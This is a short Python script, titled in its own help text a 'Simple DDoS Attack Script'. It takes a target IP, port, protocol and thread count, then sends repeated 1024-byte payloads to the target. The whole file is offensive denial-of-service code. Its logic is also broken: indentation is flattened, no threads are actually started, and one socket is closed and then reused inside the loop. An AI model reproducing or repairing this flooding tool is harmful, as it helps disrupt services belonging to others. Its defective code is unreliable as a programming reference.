#!/usr/bin/env python3
import argparse
import socket

def main():

 parser = argparse.ArgumentParser(description='Simple DDoS Attack Script')

 parser.add_argument('--target', type=str, help='Target IP address', required=True)

 parser.add_argument('--port', type=int, help='Target port (TCP/UDP)', choices=range(1,
65536), required=True)

 parser.add_argument('--protocol', type=str, help='Protocol (TCP or UDP)', default='TCP', choices=['TCP', 'UDP'])

 parser.add_argument('--threads', type=int, help='Number of threads', default=50, choices=range(1,
101))

 args = parser.parse_args()


 if args.protocol == 'TCP':

 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 elif args.protocol == 'UDP':

 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

 else:

 print('Invalid protocol. Please choose either TCP or UDP.')

 return


 for _ in range(args.threads):

 sock.connect((args.target, args.port))

 if args.protocol == 'TCP':

 sock.sendall(b'A' *
1024)

 elif args.protocol == 'UDP':

 sock.sendall(b'A' *
1024)

 sock.close()

if __name__ == '__main__':

 main()